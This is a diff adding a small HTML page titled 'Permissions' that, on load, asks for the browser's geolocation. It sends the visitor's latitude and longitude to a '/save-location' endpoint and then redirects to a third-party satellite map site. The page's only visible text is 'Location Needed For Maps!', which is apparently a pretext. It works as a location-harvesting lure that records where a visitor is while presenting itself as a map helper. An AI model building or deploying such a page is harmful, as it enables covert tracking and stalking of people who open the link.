@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Permissions</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+    </style>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(savePosition, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function savePosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const url = `/save-location?lat=${lat}&lon=${lon}`;
+
+            fetch(url)
+                .then(response => response.text())
+                .then(data => {
+                    alert(data);
+                    // Redirect after saving location
+                    window.location.href = "https://satellite-map.com/m/?gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiPka5Y8pO6Ag4OKa7RDm8BkBcvhsXXnLoe5DPCGr_AdleT6aiGZEpRoCPikQAvD_BwE";
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h1>Location Needed For Maps!</h1>
+</body>
+</html>
